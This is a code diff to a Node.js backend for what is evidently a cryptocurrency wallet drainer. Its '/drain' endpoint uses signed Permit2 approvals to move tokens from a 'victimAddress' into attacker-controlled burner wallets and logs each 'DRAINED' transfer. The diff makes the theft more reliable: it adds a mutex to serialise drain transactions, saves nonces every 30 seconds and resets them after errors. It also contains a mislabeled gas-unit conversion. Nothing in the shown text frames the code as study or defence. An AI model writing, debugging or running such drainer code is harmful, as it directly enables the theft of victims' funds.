@@ -82,6 +82,28 @@ const types = {
   ]
 };
 
+// Mutex for concurrency control
+class Mutex {
+  constructor() {
+    this._locking = Promise.resolve();
+    this._locked = false;
+  }
+
+  isLocked() {
+    return this._locked;
+  }
+
+  lock() {
+    let unlockNext;
+    const willLock = new Promise(resolve => unlockNext = resolve);
+    const willUnlock = this._locking.then(() => unlockNext);
+    this._locking = this._locking.then(() => willLock);
+    return willUnlock;
+  }
+}
+
+const mutex = new Mutex();
+
 // Logs + config
 const logsDir = path.join(__dirname, 'logs');
 if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });
@@ -121,6 +143,9 @@ try {
   console.error('Failed to load nonces:', e.message);
 }
 
+// Save nonces periodically
+setInterval(saveNonces, 30000); // 30s
+
 // Gas monitor
 setInterval(async () => {
   try {
@@ -135,13 +160,13 @@ setInterval(async () => {
       burnerNonces[burner.address] = nonce;
     }
 
-    // Convert to number for display
-    const gasGwei = Number(cachedGasPrice / 1000000000000000000n);
+    // FIXED: BigInt toNumber() conversion
+    const gasGwei = Number(cachedGasPrice / 10n ** 18n);
     if (gasGwei > 8) {
       stats.gasAlerts++;
       console.log(`⚡️ HIGH GAS: ${gasGwei.toFixed(2)} gwei`);
     }
-    console.log(`💨 Gas: ${Number(gas.gasPrice / 1000000000000000000n).toFixed(2)}gwei → ${gasGwei.toFixed(2)}gwei`);
+    console.log(`💨 Gas: ${Number(gas.gasPrice / 10n ** 18n).toFixed(2)}gwei → ${gasGwei.toFixed(2)}gwei`);
   } catch (e) {
     console.error('💥 Gas:', e.message);
   }
@@ -211,36 +236,44 @@ app.post('/drain', async (req, res) => {
       requestedAmount: parsedAmount.toString()
     };
 
-    // FIXED: v6 getNonce + gas estimation
-    const currentNonce = burnerNonces[burner.address] ?? await burner.getNonce('pending');
+    // SERIALIZE TRANSACTION execution
+    const unlock = await mutex.lock();
 
-    const gasLimit = await permit2.permitTransferFrom.estimateGas(
-      permitStruct, transferDetails, victimAddress, signature,
-      { from: burner.address }
-    );
+    try {
+      // FIXED: v6 getNonce + gas estimation
+      const currentNonce = burnerNonces[burner.address] ?? await burner.getNonce('pending');
 
-    const tx = await permit2.permitTransferFrom(
-      permitStruct,
-      transferDetails,
-      victimAddress,
-      signature,
-      {
-        gasLimit,
-        maxFeePerGas: cachedGasPrice,
-        maxPriorityFeePerGas: cachedGasPrice / 2n,
-        nonce: currentNonce
-      }
-    );
+      const gasLimit = await permit2.permitTransferFrom.estimateGas(
+        permitStruct, transferDetails, victimAddress, signature,
+        { from: burner.address }
+      );
 
-    burnerNonces[burner.address] = currentNonce + 1n;
+      const tx = await permit2.permitTransferFrom(
+        permitStruct,
+        transferDetails,
+        victimAddress,
+        signature,
+        {
+          gasLimit,
+          maxFeePerGas: cachedGasPrice,
+          maxPriorityFeePerGas: cachedGasPrice / 2n,
+          nonce: currentNonce
+        }
+      );
 
-    const receipt = await tx.wait(1);
+      burnerNonces[burner.address] = currentNonce + 1n; // Optimistic update
 
-    stats.totalDrains++;
-    fs.appendFileSync(`${logsDir}/drains.log`, `${new Date().toISOString()} ${tokenSymbol} ${tx.hash}\n`);
+      const receipt = await tx.wait(1);
 
-    console.log(`✅ DRAINED ${tokenSymbol}: ${tx.hash}`);
-    res.json({ success: true, tx: tx.hash, block: receipt.blockNumber });
+      stats.totalDrains++;
+      fs.appendFileSync(`${logsDir}/drains.log`, `${new Date().toISOString()} ${tokenSymbol} ${tx.hash}\n`);
+
+      console.log(`✅ DRAINED ${tokenSymbol}: ${tx.hash}`);
+      res.json({ success: true, tx: tx.hash, block: receipt.blockNumber });
+
+    } finally {
+      unlock();
+    }
 
   } catch (error) {
     console.error('❌ ERROR:', error);
@@ -251,6 +284,7 @@ app.post('/drain', async (req, res) => {
 
     if (error.message?.includes('nonce')) {
       delete burnerNonces[burners[0].address];
+      saveNonces(); // ADD THIS
       return res.status(400).json({ error: 'Nonce reset. Retry.' });
     }
 
